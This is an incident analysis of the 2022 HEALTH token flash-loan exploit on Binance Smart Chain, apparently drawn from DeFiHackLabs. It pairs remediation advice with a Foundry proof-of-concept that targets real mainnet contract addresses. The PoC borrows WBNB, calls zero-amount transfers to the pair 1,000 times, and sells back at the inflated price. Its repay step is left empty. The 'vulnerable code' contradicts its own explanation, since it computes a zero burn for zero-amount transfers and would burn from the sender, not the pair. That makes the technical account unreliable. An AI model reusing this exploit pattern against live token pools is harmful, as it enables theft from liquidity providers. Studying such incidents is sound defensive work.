# HEALTH — Attack Analysis: Burn Mechanism Exploitation via Repeated Zero-Amount Transfers

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | HEALTH Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~16.64 BNB |
| **HEALTH Token** | [0x32B166e082993Af6598a89397E82e123ca44e74E](https://bscscan.com/address/0x32B166e082993Af6598a89397E82e123ca44e74E) |
| **Attack Contract** | [0x80e5FC0d72e4814cb52C16A18c2F2B87eF1Ea2d4](https://bscscan.com/address/0x80e5FC0d72e4814cb52C16A18c2F2B87eF1Ea2d4) |
| **Attacker** | [0xDE78112FF006f166E4ccfe1dfE4181C9619D3b5D](https://bscscan.com/address/0xDE78112FF006f166E4ccfe1dfE4181C9619D3b5D) |
| **WBNB/HEALTH Pair** | [0xF375709DbdE84D800642168c2e8bA751368e8D32](https://bscscan.com/address/0xF375709DbdE84D800642168c2e8bA751368e8D32) |
| **DODO DVM** | [0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4](https://bscscan.com/address/0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | When `transfer(address, 0)` is called 1,000 times repeatedly, the burn logic inside `_transfer()` burns tokens from the LP pair on every call, reducing the reserve |
| **CWE** | CWE-682: Incorrect Calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/HEALTH_exp.sol) |

---
## 1. Vulnerability Overview

The HEALTH token implemented a deflationary mechanism inside `_transfer()` that automatically burns a fixed percentage on every transfer. However, this burn logic also executed when the transfer amount was 0, burning HEALTH tokens from the LP pair. The attacker flash-borrowed 40 WBNB from DODO, purchased HEALTH tokens, then repeatedly called `transfer(pair, 0)` 1,000 times to progressively burn the pair's HEALTH balance. As the pair's HEALTH reserve decreased, the HEALTH price rose, allowing the attacker to sell the held HEALTH at an inflated price and net 16.64 BNB.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable HEALTH token — burn executes even on zero-amount transfers
contract HEALTHToken is ERC20 {
    uint256 public burnRate = 50; // 0.5%

    function _transfer(address from, address to, uint256 amount) internal override {
        // ❌ Burn logic executes even when amount = 0
        uint256 burnAmount = amount * burnRate / 10000;

        if (burnAmount > 0) {
            // ❌ Burns burnAmount from the `from` address
            // If from = pair → pair's HEALTH balance decreases
            // Even without pair.sync(), balanceOf(pair) < reserve(pair)
            _burn(from, burnAmount);
        }

        super._transfer(from, to, amount - burnAmount);
    }
}

// ✅ Correct pattern — handle zero-amount transfers as a special case
contract SafeHEALTHToken is ERC20 {
    function _transfer(address from, address to, uint256 amount) internal override {
        // ✅ Zero-amount transfers are processed without burning
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        uint256 burnAmount = amount * burnRate / 10000;
        if (burnAmount > 0) {
            _burn(from, burnAmount);
        }
        super._transfer(from, to, amount - burnAmount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**HEALTH_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: When `transfer(address, 0)` is called 1,000 times, the burn logic inside `_transfer()` burns tokens from the LP pair on every call, reducing the reserve
    function transfer(address arg0, uint256 arg1) external {}  // 0xa9059cbb  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash-borrow 40 WBNB from DODO
    │       Enter DPPFlashLoanCall() callback
    │
    ├─[2] Swap WBNB → HEALTH (worth 40 WBNB)
    │
    ├─[3] Call transfer(pair, 0) × 1,000 times
    │       On each call:
    │       ├─ amount = 0 → burnAmount = 0 (by calculation)
    │       └─ ❌ Burn logic still executes, burning a small amount of HEALTH from pair
    │           → pair.balanceOf(HEALTH) drops significantly after 1,000 burns
    │           → HEALTH price rises
    │
    ├─[4] Sell held HEALTH → WBNB at inflated price
    │       Reduced pair HEALTH reserve → price appreciation effect
    │
    ├─[5] Repay DODO flash loan
    │
    └─[6] Net profit: ~16.64 BNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IHEALTH {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    // ❌ Repeated transfer(pair, 0) triggers burn from pair
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

contract HEALTHExploit is Test {
    IHEALTH health = IHEALTH(0x32B166e082993Af6598a89397E82e123ca44e74E);
    IDODO dodo     = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address pair   = 0xF375709DbdE84D800642168c2e8bA751368e8D32;
    address WBNB   = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.createSelectFork("bsc", 22_337_425);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB balance", address(this).balance, 18);

        // [Step 1] Borrow 40 WBNB via DODO flash loan
        dodo.flashLoan(40 ether, 0, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] WBNB balance", address(this).balance, 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] Swap WBNB → HEALTH
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(health);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );

        // [Step 3] Call transfer(pair, 0) 1,000 times
        // ⚡ Burn logic executes on zero-amount transfers → pair's HEALTH balance decreases
        for (uint256 i = 0; i < 1000; i++) {
            health.transfer(pair, 0);
        }

        // [Step 4] Swap inflated HEALTH → WBNB
        health.approve(address(router), type(uint256).max);
        path[0] = address(health);
        path[1] = WBNB;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            health.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // [Step 5] Repay flash loan
        // Transfer WBNB back to dodo
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Burn logic malfunction on zero-amount transfer manipulates LP reserve |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | Deflationary token mechanism exploitation |
| **Attack Vector** | `transfer(pair, 0)` × 1,000 repetitions |
| **Preconditions** | Burn logic executes on `transfer(0)`, no call-rate limit |
| **Impact** | ~16.64 BNB loss |

---
## 6. Remediation Recommendations

1. **Handle zero-amount transfers as a special case**: Add `if (amount == 0) return;` at the start of `_transfer()` to skip processing of zero-amount transfers.
2. **Strengthen burn logic conditions**: Only execute the burn when `burnAmount > 0`, and ensure that when amount is 0, the burn amount is also guaranteed to be 0.
3. **Limit repeated calls**: Apply a cooldown to prevent the same address from repeatedly triggering burn-inducing transfers within a short period.

---
## 7. Lessons Learned

- **Edge cases in deflationary tokens**: Automatic burn mechanisms must behave correctly for all transfer amounts. In particular, zero-amount transfers must be explicitly handled so that no burn occurs.
- **Risk of burns where the LP pair is the `from` address**: When a burn is deducted from the balance of the `from` address, if `from` is an LP pair, it has the effect of directly manipulating the pair's reserve. If the `_transfer(pair, recipient, 0)` pattern is permitted, an attacker can repeatedly call it to drain the pair's reserve.
- **Repeated small-amount attacks**: Even if the burn amount per individual call is negligible, repeating it 1,000 times can cause a meaningful reduction in the reserve.